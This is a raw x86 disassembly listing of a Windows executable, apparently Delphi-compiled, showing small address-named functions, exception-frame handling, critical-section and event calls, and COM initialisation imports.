jmp [ __import_lookup_table_12(ole32:CoInitialize) ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
CoTaskMemAlloc
jmp [ __import_lookup_table_12(ole32:CoTaskMemAlloc) ]
sub_4158e5
jmp sub_403a3c
sub_4158ec
pop ebp
retn
sub_4158f0
sub [ rw-data ] 0x1
retn
sub_4161f3
add [ esp + 0x4 ] 0xfffffff8
jmp sub_419118
sub_4161fd
add [ esp + 0x4 ] 0xfffffff8
jmp sub_419138
sub_4163b1
[ esp + edx * 4 - 0x6c07ffbf ]
sub_416ad5
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_417274
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_417284
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4173ac
mov eax [ eax + 0xc ]
call sub_418778
retn
sub_417683
jmp sub_403a3c
sub_41768a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417690
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418930
test eax eax
setge al
pop esi
pop ebx
retn
sub_417993
jmp sub_403a3c
sub_41799a
mov esp ebp
pop ebp
retn
sub_417a68
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_417a74
push ebx
mov ebx edx
mov edx ebx
call sub_417888
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4175e8
sub_417b20
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_417c7b
jmp sub_403a3c
sub_417d4f
jmp sub_403a3c
sub_417d60
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_417dcc
jmp sub_403a3c
sub_417dd3
pop ebx
mov esp ebp
pop ebp
retn
sub_417e1e
jmp sub_403a3c
sub_417e25
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417eb1
jmp sub_403a3c
sub_417eb8
pop ebx
pop ebp
retn
sub_417efe
jmp sub_403a3c
sub_417f05
pop ebx
pop ebp
retn
sub_417f4a
jmp sub_403a3c
sub_417f51
pop ebx
pop ebp
retn
sub_417f9b
jmp sub_403a3c
sub_417fa2
pop esi
pop ebx
pop ebp
retn
sub_417ff6
jmp sub_403a3c
sub_417ffd
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41812a
jmp sub_403a3c
sub_4181a6
jmp sub_403a3c
sub_41827c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_418a70
sub_41836c
jmp sub_403a3c
sub_4184f6
jmp sub_403a3c
sub_4184fd
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418597
jmp sub_403a3c
sub_41859e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4185bd
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4185b6
jmp sub_403a3c
sub_4185bd
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_418629
jmp sub_403a3c
sub_418630
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418728
jmp sub_403a3c
sub_41872f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
sub_418745
jmp sub_403a3c
sub_4187ac
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418acc
xor edx edx
mov eax ebx
call sub_418a90
pop ebx
retn
sub_418824
mov eax [ ebp + 0x4 ]
retn
sub_41885a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4188a8
jmp sub_403a3c
sub_4188af
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4188b4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4188cc
xor edx edx
call sub_4188d4
retn
sub_4189bc
mov edx [ eax + 0x8 ]
dec edx
call sub_4188d4
retn
sub_418b78
retn
sub_418c32
jmp sub_403a3c
sub_418c39
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40365c
sub_418cc8
jmp sub_403a3c
sub_418ccf
pop ebx
pop ecx
pop ebp
retn
sub_418cd4
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_418d2b
jmp sub_403a3c
sub_418d32
pop ebx
pop ecx
pop ebp
retn
sub_418d38
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_418d74
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
retn
sub_418d8c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_418e67
retn
sub_418e68
cmp edx [ eax + 0x4 ]
jae sub_418d74
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_418f24
test edx edx
je r-xdata
xor edx edx
call sub_418f38
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_418fee
jmp sub_403a3c
sub_418ff5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419008
xchg edx eax
call sub_418f38
retn
sub_419010
retn
sub_4190a9
jmp sub_403a3c
sub_4190b0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419106
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_41926d
jmp sub_403a3c
sub_419274
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419308
xor edx edx
mov [ eax + 0x8 ] edx
add eax 0x4
call sub_40d4f0
retn
sub_419318
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x4 ]
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_41948d
jmp sub_403a3c
sub_419494
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194d8
xor edx edx
call sub_419394
retn
sub_419646
jmp sub_403a3c
sub_419660
inc [ eax + 0xc ]
retn
sub_419664
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4196ce
jmp sub_403a3c
sub_4196dc
dec [ eax + 0xc ]
call sub_419664
retn
sub_419718
xor eax eax
retn
sub_41971c
push ebx
mov ebx ecx
mov eax ebx
call sub_404038
pop ebx
retn
sub_419812
jmp sub_403a3c
sub_419819
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419929
jmp sub_403a3c
sub_419a20
retn
sub_419a24
retn
sub_419a64
retn
sub_419a68
retn
sub_419ad4
mov eax [ eax + 0x18 ]
retn
sub_419bda
jmp sub_403a3c
sub_419be1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bfe
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_419bf7
jmp sub_403a3c
sub_419bfe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c88
jmp sub_403a3c
sub_419ca0
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419d5c
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419e05
jmp sub_403a3c
sub_419e0c
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419e18
mov eax [ ebp + 0x4 ]
retn
sub_419e4e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_419e9c
jmp sub_403a3c
sub_419ea3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419f62
jmp sub_403a3c
sub_419f69
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f8b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
sub_419f84
jmp sub_403a3c
sub_419f8b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a003
jmp sub_403a3c
sub_41a00a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a010
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41a069
jmp sub_403a3c
sub_41a070
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a078
xor eax eax
retn
sub_41a0c1
jmp sub_403a3c
sub_41a0c8
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41a1db
jmp sub_403a3c
sub_41a1e2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a277
jmp sub_403a3c
sub_41a27e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a2fc
jmp sub_403a3c
sub_41a303
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a3d3
jmp sub_403a3c
sub_41a3da
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a490
jmp sub_403a3c
sub_41a497
pop esi
pop ecx
pop ebp
retn
sub_41a51c
jmp sub_403a3c
sub_41a523
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a540
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_41a539
jmp sub_403a3c
sub_41a540
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a5cc
jmp sub_403a3c
sub_41a5e9
jmp sub_403a3c
sub_41a5f0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a62c
retn
sub_41a6af
jmp sub_403a3c
sub_41a6b6
mov eax [ ebp - 0x8 ]
call sub_41d254
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6db
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_41a6d4
jmp sub_403a3c
sub_41a6db
mov esp ebp
pop ebp
retn
sub_41a72b
jmp sub_403a3c
sub_41a732
pop esi
pop ecx
pop ebp
retn
sub_41a785
jmp sub_403a3c
sub_41a78c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a794
retn
sub_41a80f
jmp sub_403a3c
sub_41a816
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a8b3
jmp sub_403a3c
sub_41a8ba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8d7
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_41a8d0
jmp sub_403a3c
sub_41a8d7
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a8dc
retn
sub_41a956
jmp sub_403a3c
sub_41a95d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a964
mov eax edx
mov edx ecx
call sub_40810c
retn
sub_41a970
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41a988
sub_41aa00
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41aa70
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41aa8c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41ac80
mov eax [ eax + 0x18 ]
retn
sub_41ac84
mov eax [ eax + 0x14 ]
retn
sub_41ad20
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41af2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40270c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41af68
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41af80
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41af94
mov edx sub_41af80
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41afdc
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_40810c
retn
mov eax edx
mov edx ecx
call sub_4080d4
retn
sub_41b078
retn
sub_41b370
jmp sub_403a3c
sub_41b377
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41b3d8
jmp sub_403a3c
sub_41b3df
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b3e8
xor ecx ecx
call sub_41b3f0
retn
sub_41b440
jmp sub_403a3c
sub_41b447
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b488
mov eax [ eax + 0x4 ]
call sub_408768
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b498
mov eax [ eax + 0x4 ]
call sub_408794
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b4d4
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41b67d
jmp sub_403a3c
sub_41b6dc
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41b76c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41b7bc
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41b9a7
jmp sub_403a3c
sub_41b9ae
mov esp ebp
pop ebp
retn
sub_41ba58
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
retn
sub_41bae0
mov [ eax + 0x18 ] edx
retn
sub_41bc5c
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_414e18
retn
sub_41bce3
jmp sub_403a3c
sub_41bcea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bd96
jmp sub_403a3c
sub_41bd9d
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bf41
jmp sub_403a3c
sub_41bf93
jmp sub_403a3c
sub_41bfb2
jmp sub_403a3c
sub_41bfb9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfd8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41bfd1
jmp sub_403a3c
sub_41bfd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c07b
jmp sub_403a3c
sub_41c103
jmp sub_403a3c
sub_41c110
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
pop ebx
retn
sub_41c128
mov eax [ rw-data ]
call sub_41c110
retn
sub_41c160
push ebx
call sub_414c4c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41c128
sub_41c2cd
jmp sub_403a3c
sub_41c2d4
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404038
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41c3f4
jmp sub_403a3c
sub_41c3fb
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c4f2
jmp sub_403a3c
sub_41c50f
jmp sub_403a3c
sub_41c516
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c614
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41aff8
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41c6d8
push ebx
mov ebx eax
mov eax ebx
call sub_41e08c
cmp al 0x9
sete al
pop ebx
retn
sub_41c737
jmp sub_403a3c
sub_41c73e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41c7e4
jmp sub_403a3c
sub_41c7eb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ca6a
jmp sub_403788
sub_41ca96
jmp sub_403788
sub_41cb38
jmp sub_403788
sub_41cbdb
jmp sub_403788
sub_41cdb3
jmp sub_403788
sub_41cdf5
jmp sub_403a3c
sub_41ce25
jmp sub_403a3c
sub_41ce2c
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ce9b
jmp sub_403a3c
sub_41cf72
jmp sub_403a3c
sub_41cf79
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d24c
mov dl 0x1
call sub_41c1b4
retn
sub_41d384
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41d38d
jmp sub_403a3c
j_sub_41d384
jmp sub_41d384
sub_41d394
pop ebx
mov esp ebp
pop ebp
retn
sub_41d39c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41e19c
mov eax [ rw-data ]
call sub_41c110
pop ebp
retn
j_sub_4038b4
jmp sub_4038b4
j_sub_4038b4#2
jmp sub_4038b4
sub_41d588
jmp sub_403a3c
sub_41d58f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d66f
jmp sub_403a3c
sub_41d676
mov esp ebp
pop ebp
retn
sub_41d72e
jmp sub_403a3c
sub_41d735
pop ecx
pop ecx
pop ebp
retn
sub_41da37
jmp sub_403a3c
sub_41da3e
pop ebx
mov esp ebp
pop ebp
retn
sub_41dce3
jmp sub_403a3c
sub_41dcea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4032a8
retn
sub_41dd03
jmp sub_403a3c
sub_41dd27
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403788
sub_41dd5e
jmp sub_403788
sub_41dd9d
jmp sub_403a3c
sub_41dda4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ddc6
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_40405c
retn
sub_41ddbf
jmp sub_403a3c
sub_41ddc6
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41de4d
jmp sub_403788
sub_41de7a
jmp sub_403a3c
sub_41de81
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41de8c
push ecx
mov edx esp
mov ecx 0x4
call sub_41c650
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41c110
sub_41df99
jmp sub_403a3c
sub_41dfa0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e07f
jmp sub_403a3c
sub_41e086
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e0dc
jmp sub_403a3c
sub_41e0e3
pop ebx
pop ecx
pop ebp
retn
sub_41e32b
jmp sub_403a3c
sub_41e332
pop ecx
pop ecx
pop ebp
retn
sub_41e375
jmp sub_403a3c
sub_41e37c
pop ebx
pop ecx
pop ebp
retn
sub_41e418
jmp sub_403a3c
sub_41e41f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e4cd
jmp sub_403a3c
sub_41e4d4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e4e0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41e73b
jmp sub_403a3c
sub_41e742
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e767
mov eax [ ebp - 0x8 ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_41e760
jmp sub_403a3c
sub_41e767
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e78c
lea eax [ ebp - 0x1c ]
call sub_405934
lea eax [ ebp - 0x18 ]
call sub_404038
retn
sub_41e785
jmp sub_403a3c
sub_41e78c
pop ebx
mov esp ebp
pop ebp
retn
sub_41e99e
jmp sub_403a3c
sub_41e9a5
pop ebx
mov esp ebp
pop ebp
retn
sub_41e9d8
mov eax [ eax + 0x30 ]
call sub_418778
retn
sub_41ea48
call sub_41eb78
retn
sub_41ea8c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41bae0
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41eb67
jmp sub_403a3c
sub_41eb6e
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41eb78
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41b25c
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41eb90
test dl dl
je r-xdata
mov dl 0x8
call sub_420cfc
retn
mov dl 0x9
call sub_420cfc
retn
sub_41ebe7
jmp sub_403a3c
sub_41ebee
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ec86
jmp sub_403a3c
sub_41ec8d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ee2b
jmp sub_403a3c
sub_41ee32
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f173
jmp sub_403a3c
sub_41f1b5
jmp sub_403a3c
sub_41f214
jmp sub_403a3c
sub_41f21b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f480
mov dl 0x1
call sub_420cfc
retn
sub_41f488
xor edx edx
call sub_420cfc
retn
sub_41f581
jmp sub_403a3c
sub_41f757
jmp sub_403a3c
sub_41f75e
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f92c
jmp sub_403a3c
sub_41f933
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fa09
jmp sub_403a3c
sub_41fa10
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41fb27
jmp sub_403a3c
sub_41fb2e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41fce8
jmp sub_403a3c
sub_41fcef
pop ecx
pop ebp
retn
sub_41fd7a
jmp sub_403a3c
sub_41fd81
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fde8
jmp sub_403a3c
sub_41fdef
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fe6d
jmp sub_403a3c
sub_41fe74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe91
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41fe8a
jmp sub_403a3c
sub_41fe91
pop ebx
pop ecx
pop ebp
retn
sub_41ff4c
jmp sub_403a3c
sub_41ff53
pop ebx
pop ecx
pop ebp
retn
sub_420029
jmp sub_403a3c
sub_420030
pop ecx
pop ebp
retn
sub_420034
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_42013b
jmp sub_403a3c
sub_420142
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4202e9
jmp sub_403a3c
sub_420368
jmp sub_403a3c
sub_42036f
mov esp ebp
pop ebp
retn
sub_42043d
jmp sub_403a3c
sub_420444
pop ebx
mov esp ebp
pop ebp
retn
sub_4204f7
jmp sub_403a3c
sub_4204fe
pop ebx
mov esp ebp
pop ebp
retn
sub_42055d
jmp sub_403a3c
sub_420564
mov esp ebp
pop ebp
retn
sub_4209c9
jmp sub_403a3c
sub_420a23
jmp sub_403a3c
sub_420a34
jmp sub_403788
sub_420a90
jmp sub_403a3c
sub_420a97
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420af6
jmp sub_403a3c
sub_420afd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420b04
mov edx rw-data
mov ecx 0x4
call sub_41eaa4
retn
sub_420c39
jmp sub_403a3c
sub_420c40
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420cee
jmp sub_403a3c
sub_420cf5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420d34
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cf94
sub_420d68
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_420d80
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_420d8c
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_420d80
sub_420eb2
jmp sub_403788
sub_420ee1
jmp sub_403a3c
sub_420f17
jmp sub_403a3c
sub_420f1e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f3d
push rw-data
call LeaveCriticalSection
retn
sub_420f36
jmp sub_403a3c
sub_420f3d
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42100c
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_4211e8
sub_42106c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d19c
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_421080
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d19c
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_421094
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41f3b4
retn
sub_4210a0
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41f3b4
retn
sub_421348
xor eax eax
retn
sub_42134c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421354
xor eax eax
retn
sub_421358
retn
sub_42135c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40408c
pop esi
pop ebx
retn
sub_421370
mov eax [ eax + 0x4 ]
retn
sub_421374
retn
sub_421378
xor eax eax
retn
sub_42137c
retn
sub_421380
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_42138c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_421398
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_4213a4
retn
sub_4213a8
xchg edx eax
call sub_41ce40
retn
sub_4213b0
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_421438
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_4034a4
pop esi
retn
sub_42144c
retn
sub_42152c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
sub_42156c
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4216b8
push ebx
mov ebx eax
test dl dl
je r-xdata
and [ ebx + 0x24 ] 0xfb
pop ebx
retn
or [ ebx + 0x24 ] 0x4
pop ebx
retn
sub_4216cc
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4034f0
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_4216e4
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_42176c
retn
sub_4217b4
retn
sub_4217ec
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_421804
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421a28
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_4034a4
pop esi
pop ebx
retn
sub_42184c
mov al 0x1
retn
sub_421850
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421858
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_421900
xor eax eax
retn
sub_421904
retn
sub_421930
retn
sub_4219c8
push ebx
